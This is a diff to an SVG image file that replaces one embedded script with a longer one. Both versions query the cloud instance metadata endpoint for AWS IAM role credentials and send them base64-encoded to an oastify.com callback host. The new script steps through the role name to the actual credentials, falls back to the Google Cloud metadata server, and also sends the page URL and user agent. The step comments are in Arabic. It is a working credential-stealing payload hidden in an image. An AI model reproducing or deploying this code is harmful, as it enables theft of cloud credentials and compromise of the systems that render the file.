@@ -1,8 +1,47 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <script>
-    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
-      .then(r => r.text())
-      .then(data => fetch('https://bjyf16pdc3tagyy19fga1swtzk5bt5hu.oastify.com/?data='+btoa(data)))
-      .catch(e => fetch('bjyf16pdc3tagyy19fga1swtzk5bt5hu.oastify.com/?err='+btoa(e.toString())))
-  </script>
+<script>
+const C = 'https://f4kjmaahx7ee12j5uj1emwhxkoqfea2z.oastify.com';
+const meta = 'http://169.254.169.254/latest/meta-data';
+
+function send(label, data) {
+  fetch(C + '/?label=' + label + '&data=' + btoa(unescape(encodeURIComponent(data))));
+}
+
+// Step 1: تحقق إن الـmetadata متاح
+fetch(meta + '/')
+  .then(r => r.text())
+  .then(rootData => {
+    send('metadata_root', rootData);
+
+    // Step 2: جيب اسم الـIAM Role
+    return fetch(meta + '/iam/security-credentials/');
+  })
+  .then(r => r.text())
+  .then(roleName => {
+    send('iam_role_name', roleName);
+    const role = roleName.trim();
+
+    // Step 3: جيب الـCredentials الفعلية
+    return fetch(meta + '/iam/security-credentials/' + role);
+  })
+  .then(r => r.text())
+  .then(creds => {
+    send('iam_credentials', creds);
+  })
+  .catch(e => {
+    send('error', e.toString());
+
+    // جرب GCP metadata بدل AWS
+    fetch('http://metadata.google.internal/computeMetadata/v1/instance/', {
+      headers: {'Metadata-Flavor': 'Google'}
+    })
+    .then(r => r.text())
+    .then(d => send('gcp_metadata', d))
+    .catch(e2 => send('gcp_error', e2.toString()));
+  });
+
+// معلومات إضافية
+send('origin', window.location.href);
+send('env', navigator.userAgent);
+</script>
 </svg>
